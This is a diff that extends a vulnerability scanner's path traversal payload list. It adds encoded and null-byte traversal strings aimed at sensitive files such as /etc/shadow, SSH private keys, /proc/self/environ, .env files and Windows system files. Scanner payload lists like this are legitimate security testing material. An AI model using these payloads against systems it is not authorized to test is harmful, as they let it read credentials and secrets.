@@ -3,7 +3,7 @@
 # Module: scanner/modules/path_traversal.py
 
 payloads:
-  # Unix/Linux
+  # Unix/Linux — /etc/passwd
   - "../../../../etc/passwd"
   - "../../../../etc/passwd%00"
   - "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
@@ -16,9 +16,42 @@ payloads:
   - "....%2f....%2f....%2fetc%2fpasswd"
   - "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
   - "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+  # Unix — double dot variations
+  - "..././..././..././etc/passwd"
+  - "..;/..;/..;/etc/passwd"
+  - "..%00/..%00/etc/passwd"
+  - "..%0d/..%0d/etc/passwd"
+  - "..%0a/..%0a/etc/passwd"
+  - "..//..//..//etc/passwd"
+  - "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+  - "..%2f..%2f..%2f..%2fetc%2fpasswd"
+  - "....\/....\/....\/etc/passwd"
+  - "..///////..////..//////etc/passwd"
+  # Unix — other sensitive files
+  - "../../../../etc/shadow"
+  - "../../../../etc/hosts"
+  - "../../../../etc/hostname"
+  - "../../../../proc/self/environ"
+  - "../../../../proc/self/cmdline"
+  - "../../../../proc/self/fd/0"
+  - "../../../../proc/version"
+  - "../../../../var/log/apache2/access.log"
+  - "../../../../var/log/nginx/access.log"
+  - "../../../../home/ubuntu/.ssh/id_rsa"
+  - "../../../../root/.bash_history"
+  - "../../../../var/www/html/.env"
   # Windows
   - "../../../../windows/win.ini"
   - "..%5C..%5C..%5Cwindows%5Cwin.ini"
   - "..%255c..%255c..%255cwindows%255cwin.ini"
   - "..\\..\\..\\windows\\win.ini"
   - "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"
+  - "..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+  - "%252e%252e%255c%252e%252e%255cwindows%255cwin.ini"
+  - "../../../../windows/system32/drivers/etc/hosts"
+  - "../../../../boot.ini"
+  # Null byte injection
+  - "../../../../etc/passwd%00.jpg"
+  - "../../../../etc/passwd%00.png"
+  - "../../../../etc/passwd%00.txt"
+  - "../../../../windows/win.ini%00.jpg"
